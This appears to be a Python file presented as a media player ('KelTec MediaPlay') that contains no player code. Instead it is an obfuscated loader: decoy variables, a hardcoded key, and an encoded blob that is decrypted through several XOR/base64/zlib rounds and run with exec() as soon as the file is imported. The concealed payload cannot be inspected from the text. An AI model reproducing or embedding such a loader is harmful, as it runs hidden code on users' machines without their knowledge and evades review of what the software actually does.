# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 407874 ^ 224367
_lx1_1 = len("2fdc0c")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-431685)
_lx3_3 = 241257 * 0
_lx4_4 = 604292 ^ 165975
_K = '21849ea5f9708172f976d7569e843f0b371377fce3c4894b017995351202353d'
_M = '2EL5ku+gxzsuNDFuS2yWnX7EqR0ojb/dpRtWgx7Z1DiATrWI7/KcZXUyajkYbMOfL5T8Fnvd6Ir+H1GCSIuFP9BDv4+9851iJzYy'
_D = '+2ZaUAzOHGuXTnVVVsSecLYd5p0j45cXHimNy7jtmsjfeH5bPNaK4E5Dzdok15/d1VJbSeOSlLErWEaLke7z7Dbwy2hgcSKLxEwXXMB5zz3HcxG0kVelsgXbvUKkdIrcIaieaMwJ2p7gYoyyBU6AigAaIiMtGIDnKmcSydv+yhNpL8a9F1LE71hRn/Czw8fj0ztRkPWC5ZO1XLbErpaiASwjoKVYjK832ZGbmVKJjwbiu9DY4ebu9U+yUZIi+Da4ZNHTqI77RETBIXOxI9YeQlHNTjibE5gjvsWu5lhG1lQt1Q5gXo241Su5onNuQT62Rp4P35ew9SXy9s6hADNYwX7ynIbA5CtYxCC25EMfT+xRXGZJkuUCrYAZmaFoYpPyXn/+g0Z4CQC2TWnhn1QsVkpHxOA/wAobH80tacy08Kq/lPajf7DanEDuubO+BfNOrEZT7AZmRj5bIBEvhOnGNmZ7lRfd8hdt1m9XiqEnjU2eRUspSFkyibyh+3pOKGC1s1X+2xkkaPoeX+wGg42l8ZesNIc17UUXZPObXS2p0eJVyas1sy6lNxOPecZZMkUfhqMGOHHctc/JUtVotZDOCVNMtDvowkNL3BMuuoL8m9qaCuhWfyaVQlNfOdyiBWzckjaLPOO1d5oWtMNMPWmPrtC6JVTtOVN0G9Lir4YxicyiDIRIUKHR/YFtmNfKbU48ayJ0KL6gfk/RX7LtdsamOG/9dpu10HYFrprIffPjBSjyIjLxvM89M6gWKy2w/V/ippJskCATphF1upn51jYaxa0WFnOU9qrrcI1hjLPnbzXKt/dSYWTyxOI3OT6SaIDXrIiAwKehEkyR9TL8rAymgxFHZ3KxgZUGj00Uz6nzWHIWdwHNCPu/Nm3mkdcj8EwB2JCNZ6PsMCU4J1T3brvMkjeFsQC9f4B//tA2fhHxhxpo7b8NGMhMGdoV1n52lSwqtlv7+DfQ0LIAaVRCwHrFpz8njp5Ytz0lQ95dTA0jFy5jdeKEtaBH1Aa3rEjMGNxtcSAw5ZX84G6YRRxWUY7/GkYQne3JB+Ey1IvZCKTpvoL3WT3Wxef3/FID2LbkRHlcSjkytmJynMh3v61l+AXErqX5pu466bLIqrg0DKZonIaQFUOhKYPJJjMt1oobfFB3+bLflS4djhmQAudyBLwDys/86FlwbyL3nGTa18+2D36QeheR3UHBreAz+4hpS+Jo5vJgTW8cvRrSgppdWIgAzvRWBcncypbVXpEdfUQzKAI3xqrCp+jbQjcJr5QoAKXOhx8egkwC3nOX2mdqZ6gQbC/W6woxit28BRcUFX0OjITHJEjUZu/CcptrNoFVBaTvXeLUUJYQFK81ZmDgUXB4cbSTDMxIftmsksRJrVPBRLnW7oT0QOh1nJWY1B01SvlrspWbCkkNv8hialdgpUicSJXCQJy8neZADJCXmAKAxPDYuZedBiHPvGeZwa1gg81IuS1W+1xsYNu2c9h/bcFvCVYnc5jphrVGOGrBqSQGyGRe+g6VW9VV6j0pUFi22JsKiV9JMs+BTfLzeKYzl0QkJcg6NiOcj/LdI71X9xAmp4IGUjiMXuKVX745ACzPGH5NNfXXDLDj8eZ/s41Ctc5Aq8oTymdxQKUDAEbQ5cgX17el2HaJEDFDYTPGckh5acymJfD2KzOC6C8XBeyX7eLlqaTDXgiqb7uVjoh1fVWA3OFOs8C7XDs1k9I4Lh1o+CTIBCxrpK6lC4p6ZzYrBqb+x+xpCAAc5r9Q5mehFWEHFPuvmi3P59VnbBr4EYCysj4308TIzmy+Ax+fjlGF3Zj9DkA6mAYhwwHyIBly54uiYEdDET6dPIpyhx3xfaX4'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})